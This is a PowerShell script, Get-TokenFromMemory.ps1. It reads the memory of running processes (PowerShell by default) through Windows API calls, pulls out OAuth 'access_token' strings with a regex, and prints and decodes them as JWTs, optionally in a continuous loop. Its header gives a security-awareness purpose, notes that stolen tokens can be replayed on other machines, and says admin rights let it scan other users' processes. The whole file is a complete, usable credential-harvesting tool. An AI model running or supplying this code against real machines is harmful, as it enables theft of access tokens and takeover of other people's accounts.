<#  
.SYNOPSIS  
    Obtains Access Tokens from Memory

.DESCRIPTION  
    This script obtains access tokens from known processes which are in readable memory spaces.
    These tokens in certain circumstances can be replayed on other machines to connect.

    The purpose of this script is to highlight the importance of securing devices and therefor
    the tokens on them. 

    This process can scan memory spaces owned by the user running the script. If it is possible
    to elevate to administrator, for instance, by compromising a local admin account, it is possible
    to scan other users processes as well.

    How this script works:
    1. Finds proccesses which are contained in the -MonitorProcesses array. For example, the default is
        powershell
    2. When it finds a match, it dumps a map of the proccesses memory to find readable pages
    3. Then scans through the pages for any match of *access_token*

.PARAMETER MonitorProccesses
    An array of proccesses you want to scan for, by default this is @("powershell") but you can specify more
    for instance @("powershell","iexplorer")

.PARAMETER Loop
    This will cause the script to continously loop looking for proccesses and access tokens

.NOTES  
    File Name  : Get-TokenFromMemory.ps1
    Author     : Cam Murray - cam@camm.id.au

#>
Param(
    $MonitorProcesses = @("powershell"),
    [Switch]$Loop
)

    $code = @"
        using System;
        using System.Runtime.InteropServices;

        namespace Winapi
        {
            public class Kernel32
            {
                [Flags]
                public enum ProcessAccessFlags : uint
                {
                    PROCESS_VM_READ = 0x00000010,
                    PROCESS_QUERY_INFORMATION = 0x00000400,
                    ALL = 0x001F0FFF
                }
            
                [Flags]
                public enum AllocationProtectEnum : uint
                {
                    PAGE_EXECUTE = 0x00000010,
                    PAGE_EXECUTE_READ = 0x00000020,
                    PAGE_EXECUTE_READWRITE = 0x00000040,
                    PAGE_EXECUTE_WRITECOPY = 0x00000080,
                    PAGE_NOACCESS = 0x00000001,
                    PAGE_READONLY = 0x00000002,
                    PAGE_READWRITE = 0x00000004,
                    PAGE_WRITECOPY = 0x00000008,
                    PAGE_GUARD = 0x00000100,
                    PAGE_NOCACHE = 0x00000200,
                    PAGE_WRITECOMBINE = 0x00000400,
                }
                
                [Flags]
                public enum StateEnum : uint
                {
                    MEM_COMMIT = 0x00001000,
                    MEM_FREE = 0x00010000,
                    MEM_RESERVE = 0x00002000,
                }
                
                [Flags]
                public enum TypeEnum : uint
                {
                    MEM_IMAGE = 0x01000000,
                    MEM_MAPPED = 0x00040000,
                    MEM_PRIVATE = 0x00020000,
                }
            
                [StructLayout(LayoutKind.Sequential)]
                public struct MEMORY_BASIC_INFORMATION
                {
                    public IntPtr BaseAddress;
                    public IntPtr AllocationBase;
                    public AllocationProtectEnum AllocationProtect;
                    public IntPtr RegionSize;
                    public StateEnum State;
                    public AllocationProtectEnum Protect;
                    public TypeEnum Type;
                }

                [StructLayout(LayoutKind.Sequential)]
                public struct SYSTEM_INFO
                {
                    public ushort processorArchitecture;
                    ushort reserved;
                    public uint pageSize;
                    public IntPtr minimumApplicationAddress;
                    public IntPtr maximumApplicationAddress;
                    public IntPtr activeProcessorMask;
                    public uint numberOfProcessors;
                    public uint processorType;
                    public uint allocationGranularity;
                    public ushort processorLevel;
                    public ushort processorRevision;
                }

                [DllImport("kernel32.dll")]
                public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
                [DllImport("kernel32.dll")]
                public static extern int VirtualQuery(IntPtr lpAddress, ref MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
                [DllImport("kernel32.dll")]
                public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, ref MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
                [DllImport("kernel32.dll")]
                public static extern void GetSystemInfo(ref SYSTEM_INFO lpSystemInfo);
                [DllImport("kernel32.dll")]
                public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out, MarshalAs(UnmanagedType.AsAny)] object lpBuffer, int dwSize, [Out] int lpNumberOfBytesRead);
                [DllImport("kernel32.dll")]
                public static extern bool CloseHandle(IntPtr hObject);
            }
        }
"@

        $codeProvider = New-Object Microsoft.CSharp.CSharpCodeProvider
        $location = [PsObject].Assembly.Location
        $compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
        $assemblyRange = @("System.dll", $location)
        $compileParams.ReferencedAssemblies.AddRange($assemblyRange)
        $compileParams.GenerateInMemory = $True
        $codeProvider.CompileAssemblyFromSource($compileParams, $code) | Out-Null

Function Get-MemoryMap {
    Param (
        $ProcessID
    )

    # Sys Info - determines PageSize and also Maximum Application Memory

    $si = New-Object Winapi.Kernel32+SYSTEM_INFO
    [WinApi.Kernel32]::GetSystemInfo([ref] $si)

    # Set up the object for storing memory information

    $mem = New-Object Winapi.Kernel32+MEMORY_BASIC_INFORMATION

    # Get the process handle for $ProcessId

    $ProcHandle = [Winapi.Kernel32]::OpenProcess([Winapi.Kernel32+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, 0, $ProcessId)

    # First Offset is Zero.
    $NextOffset = [intPtr]::Zero

    $MemoryAddresses = @()

    Write-Host "$(Get-Date) Scanning process $ProcessID" -ForegroundColor Yellow

    # Loop through this proccesses memory space
    while ([Int64]$NextOffset -lt [Int64]$si.maximumApplicationAddress) {

        [Winapi.Kernel32]::VirtualQueryEx($ProcHandle, $NextOffset, [ref] $mem, $si.pageSize) | Out-Null

        $NextOffset = [int64]$mem.BaseAddress + [int64]$mem.RegionSize

        If($mem.Protect -ne [Winapi.Kernel32+AllocationProtectEnum]::PAGE_NOACCESS -and $mem.Protect -ne [Winapi.Kernel32+AllocationProtectEnum]::PAGE_GUARD -and $mem.Protect -ne 0) {
            $MemoryAddresses += New-Object -TypeName PSObject -Property @{
                StartAddress=$mem.BaseAddress
                EndAddress=$NextOffset
                Protection=$mem.Protect
                State=$mem.State
            }
        }

    }

    Return $MemoryAddresses

}

Function Find-Token {
    Param (
        $ProcessID,
        $MemoryAddresses,
        $BreakFirstFind=$False
    )

    # Place holder for string values
    $Result = @()
    
    # Now open the process handle with PROCESS_VM_READ for reading the pages
    $ProcHandle = [Winapi.Kernel32]::OpenProcess(([Winapi.Kernel32+ProcessAccessFlags]::PROCESS_VM_READ), 0, $ProcessID)
    
    # Read each memory address
    ForEach($MemoryAddress in $MemoryAddresses) {
    
        # The size we are reading is the amount of bytes between Start Address and EndAddress
        $SizeToRead = [int64]$MemoryAddress.EndAddress - [int64]$MemoryAddress.StartAddress

        # Create a ByteArray big enough to store $SizeToRead
        [Byte[]] $ByteArray = New-Object Byte[]($SizeToRead)
    
        $Return = [Winapi.Kernel32]::ReadProcessMemory($ProcHandle,$MemoryAddress.StartAddress,$ByteArray,$SizeToRead,0)
    
        If($Return) {
            If([System.Text.Encoding]::UTF8.Getstring($ByteArray) -match '"access_token":"([^""]*)') {
                $Token = $Matches[1]
                If($Token.Length -gt 10) {
                    Write-Host -Text "$(Get-Date) Found at $($MemoryAddress.StartAddress) to $($MemoryAddress.EndAddress) protection $($MemoryAddress.Protection)" -ForegroundColor Green
                    $Result += $Token
                    If($BreakFirstFind -eq $True) {
                        Break;
                    }
                }
            }
    
        }
    
    }
    Return $Result
}


function Parse-JWTtoken {
    <#
        The following function parses the JWT token for usable text
    #>
 
    [cmdletbinding()]
    param([Parameter(Mandatory=$true)][string]$token)
 
    #Validate as per https://tools.ietf.org/html/rfc7519
    #Access and ID tokens are fine, Refresh tokens will not work
    if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid token" -ErrorAction Stop }
 
    #Header
    $tokenheader = $token.Split(".")[0]
    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenheader.Length % 4) { $tokenheader += "=" }
    #Payload
    $tokenPayload = $token.Split(".")[1]
    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenPayload.Length % 4) { $tokenPayload += "=" }

    #Convert to Byte array
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)

    #Convert to string array
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)

    $tokobj = $tokenArray | ConvertFrom-Json
    
    return $tokobj
}

$AllTokens = @()

While($True) {

    # Get processes that are in our MonitorProcesses Param - where we will look for the ATs - exlcude current PID
    $Processes = Get-Process |Where-Object {$MonitorProcesses -contains $_.ProcessName -and $_.id -ne $PID}

    ForEach($Process in $Processes) {
        $MemoryMap = Get-MemoryMap -ProcessID $Process.ID

        # Now read the process memory attempting to find an AT
        ForEach($t in @(Find-Token -ProcessID $Process.ID -MemoryAddresses $MemoryMap -BreakFirstFind $True)) {
            If($AllTokens -notcontains $t) {

                # Add token to array - so that if we are looping with -loop we dont keep showing the same one
                $AllTokens += $t

                # Output to screen
                Write-Host "Raw Token" -ForegroundColor Green
                $t
                Write-Host "Parsed Token" -ForegroundColor Green

                Parse-JWTtoken $t
            }
            
        }

    }

    # If we don't want to continously loop
    If(!$Loop) {
        Break
    }

}
